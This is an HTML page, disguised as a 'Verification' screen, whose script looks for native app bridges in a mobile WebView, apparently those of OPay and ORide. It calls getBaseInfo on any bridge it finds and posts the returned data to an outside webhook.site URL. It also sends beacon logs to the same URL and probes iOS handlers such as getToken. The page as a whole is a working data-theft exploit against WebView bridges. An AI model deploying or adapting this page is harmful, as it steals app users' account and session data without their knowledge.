<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Verification</title>
</head>

<body style="background: white; color: black; font-family: sans-serif; text-align: center; padding: 20px;">
  <h2 id="status">INITIALIZING...</h2>
  <div id="log" style="font-size: 12px; color: #666;"></div>

  <script>
    (function () {
      var WEBHOOK = 'https://webhook.site/c4e48555-8559-4bb0-b04a-a347d20a7569';
      var status = document.getElementById('status');
      var logDiv = document.getElementById('log');

      function report(msg, type) {
        logDiv.innerHTML += '<div>' + msg + '</div>';
        var i = new Image();
        i.src = WEBHOOK + '?msg=' + encodeURIComponent(msg) + '&type=' + (type || 'info');
      }

      report('Page execution started');
      status.innerText = 'EXECUTING...';

      // List of potential bridge objects
      var bridges = ['control', 'OPay3PartyContext', 'android', 'ORideContext', 'webkit'];

      bridges.forEach(function (b) {
        try {
          if (window[b]) {
            report('Bridge found: ' + b);
            if (window[b].getBaseInfo) {
              var info = window[b].getBaseInfo();
              report('Success: ' + b + ' returned data', 'success');

              // Send data
              var xhr = new XMLHttpRequest();
              xhr.open('POST', WEBHOOK, true);
              xhr.send(JSON.stringify({ bridge: b, data: info }));

              status.innerText = 'AUTHENTICATED';
            }
          }
        } catch (e) {
          report('Error check ' + b + ': ' + e.message, 'error');
        }
      });

      // iOS WebKit Handlers
      try {
        if (window.webkit && window.webkit.messageHandlers) {
          report('WebKit handlers detected');
          var handlers = ['getBaseInfo', 'getToken', 'OPay3PartyContext'];
          handlers.forEach(function (h) {
            if (window.webkit.messageHandlers[h]) {
              report('iOS Handler: ' + h);
              window.webkit.messageHandlers[h].postMessage({ call: 'getBaseInfo' });
            }
          });
        }
      } catch (e) {
        report('WebKit error: ' + e.message, 'error');
      }

      // Final fallback log
      setTimeout(function () {
        report('Execution cycle complete');
      }, 2000);
    })();
  </script>
</body>

</html>